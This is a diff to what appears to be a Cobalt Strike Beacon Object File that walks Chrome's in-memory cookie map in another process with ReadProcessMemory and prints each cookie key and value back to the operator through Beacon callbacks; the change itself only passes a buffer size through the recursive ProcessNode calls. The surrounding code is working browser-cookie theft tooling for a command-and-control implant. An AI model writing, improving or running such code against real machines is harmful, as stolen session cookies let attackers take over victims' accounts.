@@ -224,7 +224,7 @@ extern "C" {
         }
     }
 
-    void ProcessNode(HANDLE hProcess, const Node& node, formatp* buffer, bool isChrome) {
+    void ProcessNode(HANDLE hProcess, const Node& node, formatp* buffer, int *bufsize, bool isChrome) {
         BeaconFormatReset(buffer);
         BeaconFormatPrintf(buffer, "Cookie Key: ");
         ReadString(hProcess, node.key, buffer);
@@ -233,13 +233,13 @@ extern "C" {
         BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
 #endif
         ProcessNodeValue(hProcess, node.valueAddress, buffer, isChrome);
-        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(buffer, NULL));
+        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(buffer, bufsize));
 
         //Process the left child if it exists
         if (node.left != 0) {
             Node leftNode;
             if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
-                ProcessNode(hProcess, leftNode, buffer, isChrome);
+                ProcessNode(hProcess, leftNode, buffer, bufsize, isChrome);
             else
                 BeaconPrintf(CALLBACK_ERROR, "Error reading left node! Error: %i\n", GetLastError());
         }
@@ -248,7 +248,7 @@ extern "C" {
         if (node.right != 0) {
             Node rightNode;
             if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
-                ProcessNode(hProcess, rightNode, buffer, isChrome);
+                ProcessNode(hProcess, rightNode, buffer, bufsize, isChrome);
             else
                 BeaconPrintf(CALLBACK_ERROR, "Error reading right node! Error: %i\n", GetLastError());
         }
@@ -280,8 +280,9 @@ extern "C" {
         Node firstNode;
         if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr) {
             formatp buffer;
-            BeaconFormatAlloc(&buffer, 5*1024); // RFC 6265 specifies: "At least 4096 bytes per cookie"
-            ProcessNode(hProcess, firstNode, &buffer, isChrome);
+            int bufsize = 5 * 1024;
+            BeaconFormatAlloc(&buffer, bufsize); // RFC 6265 specifies: "At least 4096 bytes per cookie"
+            ProcessNode(hProcess, firstNode, &buffer, &bufsize, isChrome);
             BeaconFormatFree(&buffer);
         }
         else {
